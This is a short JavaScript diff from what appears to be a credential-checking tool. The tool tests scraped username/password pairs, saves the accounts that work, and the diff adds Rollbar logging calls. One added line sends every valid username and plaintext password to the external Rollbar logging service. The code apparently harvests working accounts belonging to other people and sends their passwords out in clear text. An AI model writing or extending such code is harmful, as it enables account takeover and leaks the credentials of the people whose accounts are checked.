@@ -24,7 +24,9 @@ const states = urls.map((url, i) => ({ url, pageNum: minPageNum + i, lastUsers: 
 const checkAndStore = async (username, password, url) => {
   const validCredentials = await areCredentialsOk(username, password);
   console.log('validCredentials', validCredentials);
+  rollbar.info(`Are credentials valid: ${validCredentials}`);
   if (!validCredentials) return;
+  rollbar.info(`Valid account:\nUser Name: ${username}\nPassword: ${password}`);
   account.save({
     UserName: username,
     Password: password,
